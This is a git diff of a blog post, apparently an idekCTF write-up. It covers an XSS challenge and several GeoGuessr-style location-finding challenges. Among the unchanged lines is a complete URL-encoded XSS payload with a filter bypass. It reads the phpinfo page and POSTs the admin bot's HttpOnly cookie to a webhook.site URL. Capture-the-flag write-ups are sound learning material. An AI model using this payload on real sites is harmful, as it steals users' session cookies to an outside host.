@@ -1,8 +1,10 @@
 ---
 layout: post
 title: idekCTF Web and OSINT Writeup
-tags: [ctf, ctf writeup, ctf web, ctf misc, ctf osint, ctf geogussr]
+tags: [ctf, ctf writeup, ctf web, ctf misc, ctf osint, ctf geoguessr]
 ---
+
+Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck).
 
 ## web/Hello
 
@@ -17,7 +19,7 @@ Relatively easy challenge, with 161 solves. I built the payload iteratively to b
 
 Challenge goal is to get the flag set by the admin bot in the "HttpOnly" cookie. The `index.php` page is XSS-able, and and `info.php` page dumps `phpinfo()`, which shows the cookies in the request, including HttpOnly cookies.
 
-```
+```nginx
 location = /info.php {
     allow 127.0.0.1;
     deny all;
@@ -62,6 +64,28 @@ Replacing space `%20` with `%0C` to bypass filter, and the encoded payload for a
 http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc%3Da%0Conerror%3D%22fetch%28%27%5C%5Cinfo%2Ephp%5C%5Ca%2Ephp%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28r%3D%3Efetch%28%27https%3A%5C%5C%5C%5Cwebhook%2Esite%5C%5C%5BREDACTED%5D%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Ar%7D%29%29%22%3E%0A
 ```
 
-## misc/NM~~PZ~~~ (GeoGussr-style)
+## misc/NM~~PZ~~~ (GeoGuessr-style)
 
-TODO
+This is some notes on my process of solving some of the challenges with the team (also with a lot of luck involved). It may contain some errors due to limited knowledge on different locations, and just write about observations and knowledge gathered during solving the challenge.
+
+*Image sizes are reduced in the blogpost.*
+
+### beach_property (medium, Brazil)
+
+Find the very unique-looking building, screenshot and search the image with Google Lens, find it to be the Veleiros Mar hotel in São Luís, Brazil. Then my teammate marked the location on the map to complete this task.
+
+![Screenshot of Veleiros Mar hotel in the challenge](/assets/image/idekctf2024/veleiros-mar.png)
+
+### idek_islands (medium, U.S. Virgin Islands)
+
+Teammates identified through meta (Google car etc.) the location is in U.S. Virgin Islands, and likely to be in the island in the north. The location is by the coast, with coastline kinda concaves, and with buildings nearby. The shadows points inwards the land.
+
+I started searching through the south coast of the two main islands in the north of U.S. Virgin Islands, by looking at the street view coverage finding the roads close to coast, and sometimes enter into street view to check. Eventually found a road with street view coverage near the coast, and the buildings in the satellite view looks matching the ones in the image. It did not take too long. Entered street view and confirmed the location matches.
+
+### rise_above (hard, Indonesia)
+
+It took a long time to solve this one.
+
+Teammates identified the location in in Indonesia. There is top of a church in the image, signs on the other building saying "RUMAH KEPALA JAGA 1", and teammate also identified the "Indonesian Democratic Party of Struggle" flag in the image.
+
+I position Google maps at Indonesia and looked up "rumah kepala jaga", it showed the name with other numbers but not "1". I looked through some of the locations however non of them was the location. They were mostly located east-most of Sulawesi Utara on one of the main island. There were also a village with many of the same flags in the image, however that village had a church looked different. Then I zoomed out the map a bit and looked up "church" in the area, and the 2nd church I clicked on and entered street view to see was the church I was looking for (extremely lucky I guess).
